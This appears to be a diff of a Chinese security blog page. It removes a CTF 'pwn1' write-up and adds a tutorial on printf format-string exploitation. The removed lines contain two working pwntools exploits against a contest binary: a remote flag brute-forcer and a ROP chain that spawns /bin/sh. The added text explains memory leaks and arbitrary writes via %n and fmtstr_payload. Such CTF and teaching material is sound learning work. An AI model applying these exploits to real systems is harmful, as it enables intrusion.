@@ -86,22 +86,17 @@
 
 
 
-<meta name="description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
+<meta name="description" content="通常来说，最常见的是printf，那么我也就根据printf来解析。 首先来看该函数的调用格式： printf(“&amp;lt;格式化字符串&amp;gt;”, &amp;lt;参量表&amp;gt;) 很多的时候，问题其实出现在参量表，因为在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况 ​    当前字符不是 %，直接输出到相应标准输出。 ​    当前字符是 %， 继续读取下一个字符">
 <meta property="og:type" content="article">
-<meta property="og:title" content="红帽杯pwn wp">
-<meta property="og:url" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/index.html">
+<meta property="og:title" content="格式化字符串解析">
+<meta property="og:url" content="http://yoursite.com/2020/03/10/格式化字符串解析/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
+<meta property="og:description" content="通常来说，最常见的是printf，那么我也就根据printf来解析。 首先来看该函数的调用格式： printf(“&amp;lt;格式化字符串&amp;gt;”, &amp;lt;参量表&amp;gt;) 很多的时候，问题其实出现在参量表，因为在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况 ​    当前字符不是 %，直接输出到相应标准输出。 ​    当前字符是 %， 继续读取下一个字符">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png">
-<meta property="og:updated_time" content="2019-11-12T09:30:26.046Z">
+<meta property="og:updated_time" content="2020-03-10T13:06:10.695Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="红帽杯pwn wp">
-<meta name="twitter:description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
-<meta name="twitter:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
+<meta name="twitter:title" content="格式化字符串解析">
+<meta name="twitter:description" content="通常来说，最常见的是printf，那么我也就根据printf来解析。 首先来看该函数的调用格式： printf(“&amp;lt;格式化字符串&amp;gt;”, &amp;lt;参量表&amp;gt;) 很多的时候，问题其实出现在参量表，因为在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况 ​    当前字符不是 %，直接输出到相应标准输出。 ​    当前字符是 %， 继续读取下一个字符">
 
 
 
@@ -131,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/">
+  <link rel="canonical" href="http://yoursite.com/2020/03/10/格式化字符串解析/">
 
 
 
 
 
-  <title>红帽杯pwn wp | zhz'blog</title>
+  <title>格式化字符串解析 | zhz'blog</title>
   
 
 
@@ -298,7 +293,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/10/格式化字符串解析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -315,7 +310,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">红帽杯pwn wp</h1>
+          <h1 class="post-title" itemprop="name headline">格式化字符串解析</h1>
         
 
         <div class="post-meta">
@@ -327,8 +322,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-11T22:18:51+08:00">
-                2019-11-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T19:08:37+08:00">
+                2020-03-10
               </time>
             
 
@@ -401,32 +396,40 @@
       
 
       
-        <h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>程序静态链接，真恶心，呕。</p>
-<p>首先分析程序流</p>
-<p>main</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
-
-<p>catflag</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png">
-
-<p>maby is good</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png">
-
-<p>give me</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png">
-
-<p>该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且可以往里面读3个字节，随后把这个mmap分配的内 存地址赋给一个函数指针，并且执行，在这里把它称为函数v3。</p>
-<p>红箭头指的就是关键地址，我们可以直接分析该模块的汇编。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+var_14]  //这里就是mov eax, v3</span><br><span class="line">call eax  //这就是关键点，执行v3</span><br></pre></td></tr></table></figure>
-
-<p>那么自然想到往里写入code，使得之后的赋值mov [ebp+var_10], eax （就是对v4赋值）中的eax可控。使得最后的比对可控，是我们控制的v4与flag中的数据进行比对，从而达到爆破的目的</p>
-<p>贴上exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*!/usr/bin/python*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#*-\*- coding:UTF-8 -**</span></span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* pwn *<span class="keyword">import</span>* *</span><br><span class="line"></span><br><span class="line">*<span class="keyword">import</span>* string</span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* time *<span class="keyword">import</span>* sleep</span><br><span class="line"></span><br><span class="line">\<span class="comment">#*context.log_level = 'debug'*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> *<span class="title">Game</span>*<span class="params">(index,char)</span>:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *cn = process('./pwn')*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *gdb.attach(cn,'b \*0x08048C5B')*</span></span><br><span class="line"></span><br><span class="line">  cn = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="string">'RX\xc3'</span> //push edx ; pop eax ; ret</span><br><span class="line"></span><br><span class="line">  size = ord(char) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Give me a index:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Three is good number,I like it very much!'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send(shellcode)</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Leave you name of size:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(size))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send((size<span class="number">-1</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">  info = cn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">  *<span class="keyword">if</span>*(<span class="string">'2'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">elif</span>*(<span class="string">'1'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    print(char)</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">else</span>*:</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    print(info)</span><br><span class="line"></span><br><span class="line">​    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">*<span class="keyword">if</span>* __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  src = string.printable</span><br><span class="line"></span><br><span class="line">  flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">for</span>* i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">for</span>* j <span class="keyword">in</span> src:</span><br><span class="line"></span><br><span class="line">​      *<span class="keyword">if</span>* Game(i, j):</span><br><span class="line"></span><br><span class="line">​        flag += j</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">if</span>* j == <span class="string">'&#125;'</span>:</span><br><span class="line"></span><br><span class="line">​          <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​          exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">break</span>*</span><br></pre></td></tr></table></figure>
-
-<p>或者也可以利用最后的输入，提前写好code（xchg ecx, esp）进行rop</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(signum=None, stack=None)</span>:</span></span><br><span class="line">    print(<span class="string">'Strip  all debugging information'</span>)</span><br><span class="line">    os.system(<span class="string">'rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sig <span class="keyword">in</span> [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: </span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create a symbol file for GDB debugging</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     gdb_symbols = '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f = open('/tmp/gdb_symbols.c', 'w')</span></span><br><span class="line"><span class="comment">#     f.write(gdb_symbols)</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment">#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">execve_file = <span class="string">'./pwn'</span></span><br><span class="line"><span class="comment"># sh = process(execve_file, env=&#123;'LD_PRELOAD': '/tmp/gdb_symbols.so'&#125;)</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment"># sh = remote('47.104.190.38', 12001)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.27.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary files for GDB debugging</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048c5b</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_pid'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(str(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_script'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xchg ecx, esp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">sh.sendafter(<span class="string">' much!\n'</span>, payload)</span><br><span class="line">sh.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x1ff</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>,</span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>,</span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(<span class="string">'me:\n'</span>, flat(layout).ljust(<span class="number">0x80</span>, <span class="string">'\0'</span>) + <span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure>
-
+        <p>通常来说，最常见的是printf，那么我也就根据printf来解析。</p>
+<p>首先来看该函数的调用格式：</p>
+<p>printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)</p>
+<p>很多的时候，问题其实出现在参量表，因为在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
+<p>​    当前字符不是 %，直接输出到相应标准输出。</p>
+<p>​    当前字符是 %， 继续读取下一个字符</p>
+<p>​        如果没有字符，报错</p>
+<p>​        如果下一个字符是 %, 输出 %</p>
+<p>​        否则根据相应的字符，获取相应的参数，对其进行解析并输出</p>
+<h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>利用%n$p来获取栈中的数据，利用%n$s获取栈变量对应的字符串</p>
+<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>利用addr%n$s。</p>
+<p>函数会先将addr存入栈中，然后遇到%n$s对栈中存放addr的地址内容进行解析，因为%s是将对应的栈中变量视为字符串变量，输出其数值对应的地址处的字符串。</p>
+<p>所以addr%n$s的运作原理:</p>
+<p>1.addr入栈</p>
+<p>2.%n$s找到栈中第n个参数，也就是addr，对其所指向的地址处的内容进行输出。</p>
+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p>也和上面一样，addr%k$n</p>
+<h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>printf(“[addr]%Dd %N$n”)这种格式输出addr就占4个字节，执行覆盖时最小值是4，可不可以小于4？</p>
+<p>那么我们就可以将addr放在后面，这是可以的。</p>
+<p>此时printf变为printf(“xx%k$n[**] [addr]”) 其中的xx, * *可以为任意的字符。</p>
+<p>xx赋值几就几个字符，例如打印2就xx%N$n，由于又需要按字节对齐（否则程序会崩溃）那么我们就需要在$n后面补齐两个字符。</p>
+<p>这个时候，xx%N成为了第k个参数，$nxx成为了第k+1个参数，所以我们此时对于printf的利用中N就需要变成N+2</p>
+<p>注：其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p>
+<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>先对Printf作一点补充:</p>
+<p>printf (“%n”,a):当遇到%n时，程序会检查已经输入了多少字符串，然后将其写入到a中。可以通过这一点来改写栈中内存。</p>
+<p>%n写入的内存最大为4字节。</p>
+<p>%hn写入的内存最大为2字节。</p>
+<p>%hhn写入的内存最大为1字节（用于将大字节拆开写）。</p>
+<p>%xd依然会被算入这个空间。</p>
+<p>利用fmtstr！</p>
+<p>fmtstr_payload(offset, {address: value})</p>
+<p>第一个参数 offset 用 autofmt.offset 算好的即可。 </p>
+<p>然后，我们需要声明 {address: value} 来覆盖address的内容成对应的value。我们还可以同时改写多个地址：</p>
+<p>{address1:value1,address2:value2,…,address:valueN}</p>
 
       
     </div>
@@ -443,12 +446,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2019/11/11/红帽杯pwn-wp/">红帽杯pwn wp</a></p>
+  <p><span>本文标题:</span><a href="/2020/03/10/格式化字符串解析/">格式化字符串解析</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
-  <p><span>发布时间:</span>2019年11月11日 - 22:11</p>
-  <p><span>最后更新:</span>2019年11月12日 - 17:11</p>
-  <p><span>原始链接:</span><a href="/2019/11/11/红帽杯pwn-wp/" title="红帽杯pwn wp">http://yoursite.com/2019/11/11/红帽杯pwn-wp/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/11/11/红帽杯pwn-wp/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2020年03月10日 - 19:03</p>
+  <p><span>最后更新:</span>2020年03月10日 - 21:03</p>
+  <p><span>原始链接:</span><a href="/2020/03/10/格式化字符串解析/" title="格式化字符串解析">http://yoursite.com/2020/03/10/格式化字符串解析/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2020/03/10/格式化字符串解析/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -484,7 +487,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/" title="红帽杯pwn wp">http://yoursite.com/2019/11/11/红帽杯pwn-wp/</a>
+    <a href="http://yoursite.com/2020/03/10/格式化字符串解析/" title="格式化字符串解析">http://yoursite.com/2020/03/10/格式化字符串解析/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -506,8 +509,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/11/汇编笔记/" rel="next" title="汇编笔记">
-                <i class="fa fa-chevron-left"></i> 汇编笔记
+              <a href="/2020/02/24/python的初学时光/" rel="next" title="python的初学时光">
+                <i class="fa fa-chevron-left"></i> python的初学时光
               </a>
             
           </div>
@@ -516,8 +519,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/11/18/linux系统调用表-system-call-table/" rel="prev" title="linux系统调用表(system call table)">
-                linux系统调用表(system call table) <i class="fa fa-chevron-right"></i>
+              <a href="/2020/03/22/docker的搭建/" rel="prev" title="docker的搭建">
+                docker的搭建 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -634,7 +637,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露内存"><span class="nav-number">1.</span> <span class="nav-text">泄露内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露栈内存"><span class="nav-number">1.1.</span> <span class="nav-text">泄露栈内存</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露任意地址内存"><span class="nav-number">1.2.</span> <span class="nav-text">泄露任意地址内存</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#覆盖内存"><span class="nav-number">2.</span> <span class="nav-text">覆盖内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#覆盖小数字"><span class="nav-number">2.1.</span> <span class="nav-text">覆盖小数字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#覆盖大数字"><span class="nav-number">2.2.</span> <span class="nav-text">覆盖大数字</span></a></li></ol></li></ol></div>
             
 
           </div>
